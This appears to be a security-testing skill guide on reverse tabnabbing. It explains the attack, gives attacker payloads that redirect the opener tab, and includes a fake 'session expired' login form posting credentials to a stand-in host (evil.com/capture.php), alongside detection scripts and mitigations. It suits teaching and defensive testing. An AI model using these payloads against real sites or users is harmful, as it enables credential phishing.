---
name: tabnabbing
description: Reverse tabnabbing exploitation via target=_blank links. Use when testing external link handling.
---

# Tabnabbing (Reverse Tabnabbing)

## Description
Tabnabbing is an attack where a malicious page accessed via a link can rewrite the content of the original page that contained the link. This typically replaces the original page with a phishing site to steal user credentials.

## How It Works

1. Victim visits legitimate site with external link
2. Link opens in new tab (target="_blank")
3. New tab has access to `window.opener` object
4. Malicious page redirects original tab to phishing site
5. Victim returns to "original" tab and enters credentials
6. Credentials sent to attacker

## Vulnerable Code

### HTML
```html
<!-- VULNERABLE: No rel attribute -->
<a href="https://evil.com" target="_blank">Click me</a>

<!-- VULNERABLE: Empty rel attribute -->
<a href="https://evil.com" target="_blank" rel="">Click me</a>
```

### JavaScript
```javascript
// VULNERABLE: window.open without noopener
window.open('https://evil.com');

// VULNERABLE: Dynamically created link
const link = document.createElement('a');
link.href = 'https://evil.com';
link.target = '_blank';
link.click();
```

## Exploitation

### Basic Payload (Attacker's Page)
```html
<!DOCTYPE html>
<html>
<head>
    <title>Interesting Content</title>
</head>
<body>
    <h1>Loading...</h1>
    <script>
        // Redirect the original tab to phishing page
        if (window.opener) {
            window.opener.location = 'https://evil.com/phishing.html';
        }
    </script>
</body>
</html>
```

### Phishing Page (Looks Like Original)
```html
<!DOCTYPE html>
<html>
<head>
    <title>Login - Legitimate Site</title>
    <!-- Copy CSS from legitimate site -->
</head>
<body>
    <h1>Session Expired</h1>
    <p>Please log in again to continue.</p>
    <form action="https://evil.com/capture.php" method="POST">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
</body>
</html>
```

### Delayed Redirect
```javascript
// Wait for user to engage with new tab before redirecting original
setTimeout(function() {
    if (window.opener && !window.opener.closed) {
        window.opener.location = 'https://evil.com/phishing.html';
    }
}, 3000);
```

### With Referrer Check Bypass
```javascript
// Some sites check referrer
if (window.opener) {
    // Use meta refresh to avoid referrer
    window.opener.document.write('<meta http-equiv="refresh" content="0;url=https://evil.com/phishing.html">');
}
```

## Attack Scenarios

### Scenario 1: Comment Section
```
1. Attacker posts comment with link on target site
2. Link points to attacker-controlled page
3. When victim clicks, new tab opens
4. Original tab redirected to phishing page
5. Victim enters credentials thinking session expired
```

### Scenario 2: Email Links
```
1. Email contains link opening in new tab
2. Link leads to attacker's page
3. Original webmail tab redirected to fake login
4. Victim re-enters email credentials
```

### Scenario 3: Social Media
```
1. Attacker shares link on social platform
2. Link opens in new tab
3. Original social media tab replaced with lookalike
4. Victim enters social media credentials
```

## Detection

### Finding Vulnerable Links
```javascript
// Browser console - find vulnerable links
document.querySelectorAll('a[target="_blank"]').forEach(link => {
    const rel = link.getAttribute('rel') || '';
    if (!rel.includes('noopener') && !rel.includes('noreferrer')) {
        console.log('Vulnerable:', link.href);
    }
});
```

### Manual Testing
```
1. Find external link with target="_blank"
2. Check if rel="noopener" or rel="noreferrer" is present
3. If not, verify window.opener is accessible
4. Test if opener.location can be modified
```

## Mitigation

### Secure HTML
```html
<!-- SECURE: Use noopener -->
<a href="https://external.com" target="_blank" rel="noopener">Click me</a>

<!-- SECURE: Use noreferrer (also implies noopener) -->
<a href="https://external.com" target="_blank" rel="noreferrer">Click me</a>

<!-- SECURE: Use both -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">Click me</a>
```

### Secure JavaScript
```javascript
// SECURE: window.open with noopener
const newWindow = window.open('https://external.com', '_blank', 'noopener');

// SECURE: Manually nullify opener
const newWindow = window.open('https://external.com');
if (newWindow) {
    newWindow.opener = null;
}
```

### Content Security Policy
```http
# Restrict where navigation can occur
Content-Security-Policy: navigate-to 'self' https://trusted.com
```

### Automatic Fix with JavaScript
```javascript
// Fix all links on page load
document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('a[target="_blank"]').forEach(link => {
        const rel = link.getAttribute('rel') || '';
        if (!rel.includes('noopener')) {
            link.setAttribute('rel', rel + ' noopener');
        }
    });
});
```

## Browser Support

| Browser | Default Behavior |
|---------|------------------|
| Chrome 88+ | Implicitly adds noopener |
| Firefox 79+ | Implicitly adds noopener |
| Safari 12.1+ | Implicitly adds noopener |
| Edge 88+ | Implicitly adds noopener |
| Older browsers | Vulnerable by default |

## Testing Checklist

- [ ] Find links with target="_blank"
- [ ] Check for rel="noopener" or rel="noreferrer"
- [ ] Test window.opener accessibility
- [ ] Test opener.location modification
- [ ] Check dynamically created links
- [ ] Test window.open() calls
- [ ] Verify CSP headers

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Tabnabbing
- https://owasp.org/www-community/attacks/Reverse_Tabnabbing
- https://mathiasbynens.github.io/rel-noopener/
